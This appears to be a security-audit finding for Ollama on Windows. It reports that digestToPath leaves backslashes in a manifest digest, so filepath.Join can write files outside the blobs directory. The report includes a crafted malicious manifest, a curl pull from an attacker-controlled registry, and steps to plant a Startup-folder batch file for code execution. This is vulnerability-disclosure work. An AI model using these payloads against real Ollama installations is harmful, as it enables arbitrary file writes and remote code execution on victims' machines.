Phase: 10
Sequence: 001
Slug: windows-backslash-digest-traversal
Verdict: VALID
Rationale: digestToPath only strips the colon separator; on Windows, filepath.Join treats '\' in the digest as a path separator, allowing a manifest digest like sha256:subdir\target to write or read outside destDir without any '..' — a distinct traversal primitive unblocked by the '..'-focused reasoning in p8-001 that requires no depth escalation.
Severity-Original: HIGH
Severity-Final: HIGH
PoC-Status: pending
Origin-Finding: archon/findings-draft/p8-001-pullwithtransfer-digest-path-traversal.md
Origin-Pattern: AP-001R

## Summary

On Windows, `filepath.Join` interprets both `/` and `\` as path separators. The `digestToPath`
function (`x/imagegen/transfer/transfer.go:165`) performs only a colon-to-dash substitution:

```go
return digest[:6] + "-" + digest[7:]
// sha256:subdir\target  →  sha256-subdir\target
```

`filepath.Join(destDir, "sha256-subdir\\target")` on Windows resolves to
`<destDir>\sha256-subdir\target`, which is a subdirectory descent, not a traversal out.
However, with `..` in the component: `sha256:..\..\..\Users\Public\pwn` → `sha256-..\..\..\Users\Public\pwn`,
and `filepath.Join(destDir, "sha256-..\\..\\..\\Users\\Public\\pwn")` on Windows escapes `destDir`
to `C:\Users\Public\pwn` — an arbitrary path write.

Crucially, on Windows the `manifest.BlobsPath` regex guard (`^sha256[:-][0-9a-fA-F]{64}$`) also
rejects `\` and `..`, but `digestToPath` never calls this guard. The bypass is identical to the
Linux `/` variant but uses `\` as the path separator character in the JSON digest field.

Additionally, a digest of `sha256:windows\system32\drivers\etc\hosts` (no `..`) places a `.tmp`
file directly in `C:\Windows\System32\drivers\etc\hosts.tmp` if `destDir` is a drive root — but
more critically `os.MkdirAll` creates the intermediate path `C:\Windows\System32\drivers\etc\`
even if `destDir` is `C:\Users\ollama\.ollama\models\blobs`. A digest like
`sha256:..\..\..\Windows\System32\drivers\etc\hosts` escapes to `C:\Windows\System32\drivers\etc\hosts.tmp`.

On Windows, the Ollama daemon commonly runs under:
- The installing user's context (interactive install)
- LocalSystem or a service account (MSI install)

Either can write to `%APPDATA%`, `%USERPROFILE%`, and system paths depending on the account.
LocalSystem has full filesystem access.

## Location

- `x/imagegen/transfer/download.go:213-215` — `os.MkdirAll` + `os.Create(tmp)` write sinks
- `x/imagegen/transfer/download.go:57-65` — `os.Stat` cache-skip oracle (see p10-001-a)
- `x/imagegen/transfer/transfer.go:164-170` — `digestToPath` — no `\` rejection
- `server/images.go:720-728` — `pullWithTransfer` passes raw `layer.Digest`

## Attacker Control

Same as p8-001:
- Attacker hosts registry serving manifest with digest containing `\`-based path components.
- Victim on Windows does `POST /api/pull {"name":"evil.registry/model","insecure":true}`.
- `\` in JSON digest field is encoded as `\\` (valid JSON), decoded to single `\` in Go string.

## Trust Boundary Crossed

Network (attacker-controlled registry) → Windows filesystem (ollama service user / LocalSystem
scope). Bypasses `manifest.BlobsPath` regex guard which is never invoked on this path.

## Impact

- Arbitrary directory tree creation (`os.MkdirAll`) at any path writable by the service account.
- Arbitrary `.tmp` file creation with partial attacker-controlled content for blobs >= 64 MB
  that stall or timeout.
- On Windows with LocalSystem (MSI install): write to `C:\Windows\System32\`, `C:\ProgramData\`,
  startup scripts, scheduled task XML files, etc. → trivial RCE at next reboot or task trigger.
- On Windows with user-account install: write to `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` → RCE at next login.
- Compared to p8-001 (Linux): Windows deployments may run with higher privilege (LocalSystem)
  making the impact class higher in practice.

## Evidence

```go
// x/imagegen/transfer/transfer.go:164-170
func digestToPath(digest string) string {
    if len(digest) > 7 && digest[6] == ':' {
        return digest[:6] + "-" + digest[7:]
        // sha256:..\..\..\Windows\pwn  →  sha256-..\..\..\Windows\pwn
        // '\' is NOT stripped; filepath.Join on Windows treats it as separator
    }
    return digest
}

// x/imagegen/transfer/download.go:213-215
func (d *downloader) save(ctx context.Context, blob Blob, r io.Reader, existingSize int64) (int64, error) {
    dest := filepath.Join(d.destDir, digestToPath(blob.Digest))
    // On Windows: filepath.Join("C:\\Users\\ollama\\.ollama\\models\\blobs",
    //              "sha256-..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts")
    //           = "C:\\Windows\\System32\\drivers\\etc\\hosts"
    tmp := dest + ".tmp"
    os.MkdirAll(filepath.Dir(dest), 0o755)   // creates C:\Windows\System32\drivers\etc\ tree
    ...
    f, err = os.Create(tmp)                  // creates C:\Windows\System32\drivers\etc\hosts.tmp
```

The bypass-analysis document at
`archon/bypass-analysis/cve-2024-37032-path-traversal.md` (Windows `\` in digest row) confirms:
"`digestToPath` accepts `sha256:..\..\foo`; `filepath.Join` honours `\` on Windows; the original
regex `[0-9a-fA-F]` would have rejected this if applied."

## Reproduction Steps

On a Windows machine with Ollama installed:

1. Attacker registry (HTTP) serves manifest with tensor layer and traversal layer:
   ```json
   {
     "layers": [
       {"mediaType":"application/vnd.ollama.image.tensor",
        "digest":"sha256:aaaa...64hex...","size":1},
       {"mediaType":"application/vnd.ollama.image.model",
        "digest":"sha256:..\\..\\..\\Users\\Public\\pwn",
        "size":1073741824}
     ]
   }
   ```
   Note: JSON requires `\\` to encode a single `\`; the Go JSON decoder yields one `\` per `\\`.

2. On victim Windows host:
   ```
   curl -X POST http://127.0.0.1:11434/api/pull ^
     -d "{\"name\":\"attacker.host/evil/foo:latest\",\"insecure\":true}"
   ```

3. Large blob (1 GB) is requested; `MkdirAll` creates `C:\Users\Public\pwn.tmp` parent dir
   immediately. If transfer stalls after >= 64 MB, `C:\Users\Public\pwn.tmp` persists with
   partial attacker-controlled content.

4. Replace traversal target with `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\pwn.bat`
   and blob content with `start /b cmd /c calc.exe` for a reliable user-level RCE primitive on
   next Windows login.
